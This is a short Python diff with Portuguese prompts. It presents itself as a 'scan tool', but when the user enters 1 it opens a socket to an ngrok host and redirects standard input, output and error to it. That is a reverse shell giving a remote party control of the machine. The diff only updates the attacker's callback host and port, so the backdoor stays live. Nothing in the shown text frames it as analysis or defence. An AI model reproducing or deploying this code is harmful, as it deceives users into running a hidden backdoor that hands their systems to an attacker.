@@ -16,7 +16,7 @@ scan = int(input('Digite 1 para iniciar a Ferramenta de Scan: '))
 if(scan == 1):
   print('Iniciado! Aguarde até 5 minutos para a Ferramenta iniciar!')
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-  s.connect(("4.tcp.ngrok.io",17218))
+  s.connect(("2.tcp.ngrok.io",18442))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
